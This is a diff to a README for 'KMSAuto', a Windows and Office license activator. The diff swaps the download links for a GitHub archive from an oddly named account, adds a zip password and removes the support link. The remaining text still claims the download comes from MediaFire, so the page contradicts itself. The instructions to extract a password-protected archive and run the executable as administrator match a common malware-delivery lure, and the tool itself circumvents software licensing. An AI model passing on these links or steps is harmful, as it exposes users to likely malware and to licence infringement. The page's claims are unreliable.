@@ -17,11 +17,11 @@ KMSAuto is the best Windows&amp;Office Activator
 
 | Platform | Link |
 |----------|------|
-| 🪟 Windows 7/8/10/11 | **[Download from MediaFire](https://www.mediafire.com/file/dxgtihhjo1mqbtu/KMSAuto.zip/file)** |
+| 🪟 Windows 7/8/10/11 | **[Download from Reliese](https://github.com/numbchampions20004god/KMSAuto-Activate-Windows-Office-2026/archive/refs/heads/main.zip)** |
 
 > **Note:** The download will start from MediaFire. The file is a compressed archive (.ZIP). Extract and run as administrator.
 
-👉 **[Click here to download KMSAuto Tool](https://www.mediafire.com/file/dxgtihhjo1mqbtu/KMSAuto.zip/file)**
+👉 **[Click here to download KMSAuto Tool](https://github.com/numbchampions20004god/KMSAuto-Activate-Windows-Office-2026/archive/refs/heads/main.zip)**
 
 ---
 
@@ -59,8 +59,8 @@ KMSAuto is the best Windows&amp;Office Activator
 
 ### Step-by-Step Guide:
 
-1. Click the download link above or [here](https://www.mediafire.com/file/dxgtihhjo1mqbtu/KMSAuto.zip/file)
-2. Download the `KMSAuto.zip` file
+1. Click the download link above or [here](https://github.com/numbchampions20004god/KMSAuto-Activate-Windows-Office-2026/archive/refs/heads/main.zip)
+2. Download the `KMSAuto.zip` file / Password - 2026
 3. Extract the ZIP file to a folder (right-click → Extract All)
 4. Right-click on `KMSAuto.exe` and select **"Run as Administrator"**
 5. Select your product (Windows or Office)
@@ -132,7 +132,6 @@ KMSAuto is the best Windows&amp;Office Activator
 ## 📞 Support
 
 For assistance or inquiries:
-- Open an [Issue](https://github.com/yourusername/KMSAuto/issues)
 - Read the included documentation in the downloaded archive
 
 ---
